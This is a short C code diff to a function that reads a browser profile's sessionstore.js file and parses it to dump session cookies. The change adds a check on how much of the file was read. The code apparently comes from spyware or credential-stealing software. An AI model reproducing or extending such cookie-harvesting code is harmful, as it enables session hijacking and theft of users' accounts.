@@ -105,7 +105,7 @@ int DumpSessionCookies(WCHAR *profilePath)
 	JSONObject root;
 	WCHAR sessionPath[MAX_PATH];
 	WCHAR *host = NULL, *name = NULL, *cvalue = NULL;
-	DWORD dummy;
+	DWORD n_read;
 
 	swprintf_s(sessionPath, MAX_PATH, L"%s\\sessionstore.js", profilePath);
 	h_session_file = FNC(CreateFileW)(sessionPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
@@ -117,8 +117,12 @@ int DumpSessionCookies(WCHAR *profilePath)
 		CloseHandle(h_session_file);
 		return 0;
 	}
-	ReadFile(h_session_file, session_memory, session_size, &dummy, NULL);
+	ReadFile(h_session_file, session_memory, session_size, &n_read, NULL);
 	CloseHandle(h_session_file);
+	if (n_read != session_size) {
+		SAFE_FREE(session_memory);
+		return 0;
+	}
 	value = JSON::Parse(session_memory);
 	if (!value) {
 		SAFE_FREE(session_memory);
